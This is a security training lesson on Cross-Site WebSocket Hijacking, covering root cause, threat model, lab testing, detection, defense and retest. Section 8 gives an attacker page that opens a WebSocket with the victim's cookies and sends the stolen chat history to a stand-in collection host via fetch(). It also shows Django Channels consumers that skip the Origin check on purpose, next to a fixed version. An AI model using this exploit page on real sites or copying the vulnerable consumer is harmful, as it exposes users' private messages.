---
schema_version: 1
id: WEB-A05-WEBSOCKET-HIJACKING
title: "Cross-Site WebSocket Hijacking (CSWSH)"
slug: websocket-hijacking
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  []
cwe:
  - CWE-1385
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# Cross-Site WebSocket Hijacking (CSWSH)

> [!CAUTION]
> Only practice on systems you own or are explicitly authorized. Use synthetic data, disposable fixtures, and limit resources; do not send payloads to the Internet or real targets.

## 1. Learning Objectives

After this lesson, you can:

- Explain Cross-Site WebSocket Hijacking (CSWSH) by root cause instead of just describing the consequence.
- Identify the trust boundary, assets, actors, and necessary conditions for the vulnerability to be exploited.
- Conduct controlled testing in a local lab and distinguish expected results from false positives.
- Select the root control, implement the fix, and retest using positive, negative, and boundary cases.

## 2. Prerequisites

- Understand the HTTP request/response flow in a Cross-Site WebSocket Hijacking (CSWSH) scenario and how to handle input across trust boundaries. 
- Differentiate between authentication, authorization, and validation.
- Be able to read code/configuration in the language or framework appearing in the examples.
- Have a local lab isolated, with synthetic data, observable logs, and clear testing permissions.

## 3. Background Knowledge

Normally, when you browse the web, the browser works in a request-response manner: you send a request, the server returns a response, and then it ends. However, for real-time applications like messaging (chat) or stock price boards, this mechanism is too slow. To solve this, WebSocket technology was developed, helping to open a continuous two-way communication channel between the browser and the server. When starting to establish this channel (the handshake process), the browser will include your authentication cookie. The special point is that WebSocket is not bound by the Same-Origin Policy (SOP), meaning that a foreign website can also send a request to open a WebSocket connection to your server.

```http
GET /chat HTTP/1.1
Host: app.victim.lab.test
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://app.victim.lab.test
Cookie: session=abc123def456
```

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```
Important point: the handshake is a **normal HTTP request** — the browser automatically sends cookies. The `Origin` header is added by the browser, but **the server must check it itself** — otherwise, any website can open a WebSocket to your server using the victim's cookies.

Unlike AJAX (blocked by the Same-Origin Policy), WebSocket **is not restricted by SOP** — browsers allow any origin to open a WebSocket connection to any server. This is the root cause of CSWSH.

## 4. Description and Root Cause

The Cross-Site WebSocket Hijacking vulnerability (or CSWSH) occurs when a WebSocket server 'blindly' accepts all connection requests without bothering to check which website the request comes from (ignoring the `Origin` header), relying solely on cookies automatically sent along to authenticate the user. An attacker can trick you into visiting a malicious website of theirs. This website will silently send a request to open a WebSocket connection to your account on the target server. Because the browser automatically attaches your cookies, the connection will be successfully established under your identity. Unlike typical CSRF attacks that send only a single command, this attack is far more dangerous because it opens a two-way channel: the attacker can continuously send commands and read all of your private response data in real time.

> **Reference:** Technical claims in the lesson are marked with source markers; when applying in practice, refer to the version/framework being used: [S1], [S2], [S3], [S4], [S5].

## 5. Threat Model and Exploitation Conditions

- **Assets:** Authenticated WebSocket session and message. 
- **Actor, authentication, and role:** untrusted page opens a socket using the victim's cookie with user role. 
- **Exploitation conditions:** ambient cookie authenticates handshake but lacks Origin or session-attached token. 
- **Browser, proxy, framework, and version:** Chromium and ws/websockets server pinned on .lab.test; loopback; must record actual image/package version along with evidence. 
- **Mandatory evidence:** the same correlation ID must link input, control decision, and impact the correct asset; individual status code is not sufficient. [S1]

## 6. Attack Mechanism

For websocket hijacking, the ambient cookie authenticates the handshake but lacks Origin or session-attached token. A positive case must demonstrate that the input reaches the correct sink and produces the described impact; a negative case, when origin control is enabled, must be blocked before any side effect. Conclusions only apply to the environment pinned in section 5. [S1]

## 7. Testing in an Authorized Lab

1. **Setup:** launch Chromium and the ws/websockets server pinned on .lab.test; loopback; only load synthetic data, enable application/proxy/datastore logs, and attach correlation ID.
2. **Baseline:** send a valid input of the websocket hijacking use case; record raw request/response, decide policy and asset status before the test.
3. **Input and actions:** use only one core payload in item 8 within the annotated context; change one variable at a time and comply with the request cap.
4. **Expected result:** consider a vulnerable fixture positive only when logs demonstrate the mechanism of “ambient cookie authenticates handshake but lacks Origin or session-attached token”; secure fixture must block before side effects and boundary input must fail closed.
5. **Cleanup:** delete data, markers, and websocket hijacking logs; revoke related session/cache, revert snapshot, and confirm no remaining test callbacks/processes.
6. **Safety limits:** run only on loopback/`.lab.test`; do not use real targets, credentials, or data; OOB/DoS/state-changing must have network/CPU/memory/request cap.

## 8. Payloads and Scope of Applicability

The blocks below are minimal lab examples according to the context recorded in the annotation. Before use, check the framework/version, encoding, expected result, and risk; only run in an authorized local fixture. Extended payload belongs to `security_cheatsheet.md`; lessons only retain the core examples.

**Step 1 — The attacker creates the exploit page:**

<!-- payload-id: WEB-A05-WEBSOCKET-HIJACKING-001 -->
<!-- context: pinned Chromium opens wss://victim.lab.test/chat from untrusted.lab.test -->
<!-- prerequisites: both hosts map to loopback; synthetic user cookie; one socket and one fixture message; no external fetch -->
<!-- encoding: WebSocket handshake is browser-generated; JSON message is UTF-8 text and contains only action=get_history -->
<!-- expected-result: vulnerable server accepts wrong Origin and returns fixture history; fixed server closes handshake before messages -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
<!-- Attacker's page: https://callback.lab.test/hijack.html -->
<!-- Victim visits this page while logged into victim.lab.test -->
<script>
  // Browser sends victim's cookies with the handshake
  var ws = new WebSocket("wss://victim.lab.test/chat");

  ws.onopen = function() {
    console.log("Connected with victim's session!");
    // Send commands as the victim
    ws.send(JSON.stringify({
      action: "get_chat_history",
      room: "private"
    }));
  };

  ws.onmessage = function(event) {
    // Receive victim's private data
    var data = JSON.parse(event.data);

    // Exfiltrate to attacker's server
    fetch("https://callback.lab.test/collect", {
      method: "POST",
      body: JSON.stringify({
        stolen: data,
        timestamp: Date.now()
      })
    });
  };
</script>
```
**Step 2 — Vulnerable server:**

<!-- payload-id: WEB-A05-WEBSOCKET-HIJACKING-002 -->
<!-- context: pinned Django Channels consumer authenticates cookie but intentionally omits Origin validation -->
<!-- prerequisites: loopback ASGI fixture; synthetic user/session only; one trusted and one untrusted handshake -->
<!-- encoding: ASGI scope supplies Origin and cookie headers as bytes decoded by the framework; no manual framing -->
<!-- expected-result: untrusted Origin is accepted only by vulnerable consumer; AllowedHostsOriginValidator rejects it -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```python
# Vulnerable WebSocket server (Python/Django Channels)
# ❌ No Origin header validation
class ChatConsumer(WebsocketConsumer):
    def connect(self):
        # Only checks session cookie — automatically sent by browser
        user = self.scope["user"]
        if user.is_authenticated:
            self.accept()  # Accepts connection from ANY origin
        else:
            self.close()

    def receive(self, text_data):
        data = json.loads(text_data)
        if data["action"] == "get_chat_history":
            # Returns private messages to whoever connects
            history = Message.objects.filter(room=data["room"])
            self.send(text_data=json.dumps({
                "messages": [m.content for m in history]
            }))
```

## 9. Vulnerable Code and Secure Code

```python
# ❌ VULNERABLE: No origin check, cookie-only auth
class NotificationConsumer(WebsocketConsumer):
    def connect(self):
        if self.scope["user"].is_authenticated:
            self.accept()  # Any website can hijack this

# ✅ SECURE: Origin validation + token-based auth
class NotificationConsumer(WebsocketConsumer):
    ALLOWED_ORIGINS = ["https://myapp.lab.test"]

    def connect(self):
        # Check Origin header
        headers = dict(self.scope["headers"])
        origin = headers.get(b"origin", b"").decode()

        if origin not in self.ALLOWED_ORIGINS:
            self.close(code=4003)
            return

        # Require token-based authentication (not just cookies)
        query = parse_qs(self.scope["query_string"].decode())
        token = query.get("token", [None])[0]

        if not validate_ws_token(token, self.scope["user"]):
            self.close(code=4001)
            return

        self.accept()
```

## 10. Detection

- Log the actor/session, route or operation, object/resource related to Cross-Site WebSocket Hijacking (CSWSH), policy result, and correlation ID; do not log secrets or full tokens. 
- Compare authorization/validation failures with a valid baseline and alert according to behavior chains, not just a single payload chain. 
- Combine application telemetry, reverse proxy, and datastore to confirm whether the request reached the sink and whether there was any impact. 
- Scanner or WAF alert is only an investigation signal; it is not the sole evidence that the vulnerability exists. [S1]

## 11. Defense

### Compulsory control

- Verify the Origin and session-attached token during handshake; authorize each operation message.
- Apply the same control to all routes, operations, and equivalent processing paths; failure must stop before side effects.

### Defense-in-depth

With Cross-Site WebSocket Hijacking (CSWSH), the following measures help reduce the blast radius or increase detection capability. Rate limiting, UUID unpredictability, WAF, CSP, or common validation should not be used as a substitute for native controls.

- **Summary**: Validate the Origin header during the WebSocket handshake and use a token-based authentication mechanism to prevent CSRF.
- **Detailed steps**:
  - Check the Origin header in the handshake to ensure the connection request comes from an allowed domain.
  - Use a unique, random authentication token (CSRF token) transmitted through the handshake or the first message.
  - Implement token-based authentication instead of relying solely on Cookies.

## 12. Retest

- **Positive case:** With Cross-Site WebSocket Hijacking (CSWSH), the valid flow still works correctly for the actor and allowed data.  
- **Negative case:** Using the same input/resource but with an actor or context not permitted, it should be denied without leaking sensitive details.  
- **Boundary case:** Test empty values, extreme boundaries, different encodings, repeated requests, expired session states, and equivalent paths/operations.  
- **Telemetry:** Confirm that policy decisions, application logs, proxy logs, and datastore side effects match correlation ID.  
- **Rechecking:** Save minimal scripts to reproduce old issues and demonstrate that the fix does not depend on WAF/rate limit.

## 13. Common Mistakes

- Only check the status code or response string of Cross-Site WebSocket Hijacking (CSWSH) without verifying side effects and logs.  
- Use a correctly formatted payload but with the wrong DBMS, browser, framework, protocol, or injection context.  
- Treat UUID, rate limit, WAF, CSP, or general input validation as a fix for another root control.  
- Only fix one route while the same sink/policy is used in another route.  
- Conclude that a vulnerability exists without recording the source, fixture version, and observable evidence.

## 14. Summary and Checklist

- [ ] Root cause, consequences, and exploitation techniques have been separated.  
- [ ] Actor, role/authentication, trust boundary, technology, and version are clear.  
- [ ] Payload has a unique ID, context, encoding, conditions, expected result, risk, validation, and source.  
- [ ] Code prone to errors/unsafe uses the same framework, version, and use case.  
- [ ] Mandatory controls cannot be replaced with defense-in-depth.  
- [ ] Positive, negative, boundary cases, and telemetry have been retested.  
- [ ] Sensitive technical claims have references in section 17, and all links are only in sections 16–17.  
- [ ] Cleanup completed; no secrets, real targets, Internet callbacks, or customer data remain.

## 15. Glossary

- **WebSocket**: A protocol that supports continuous two-way (full-duplex) data transmission over a single TCP connection.
- **CSWSH (Cross-Site WebSocket Hijacking)**: An attack that hijacks the user's WebSocket connection from a cross-site malicious website.
- **Handshake**: The process of initiating the initial connection setup between client and server.
- **Origin Header**: The HTTP header automatically filled by the browser indicating the domain sending the request.
- **Full-Duplex**: A two-way transmission mode that occurs simultaneously at the same time.

## 16. Related Lessons and Further Reading

- [PostMessage Exploitation](../postmessage-exploitation/) — Client-Side security issues.

## 17. References

- **[S1]** PortSwigger. https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking — version/status: current version; accessed: 2026-07-17. 
- **[S2]** OWASP. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets — version/status: current version; accessed: 2026-07-17. 
- **[S3]** CWE. https://cwe.mitre.org/data/definitions/1385.html — version/status: current version; accessed: 2026-07-17. 
- **[S4]** Christian Schneider. https://www.christian-schneider.net/CrossSiteWebSocketHijacking.html — version/status: current version; accessed: 2026-07-17. 
- **[S5]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — version/status: current version; accessed: 2026-07-17.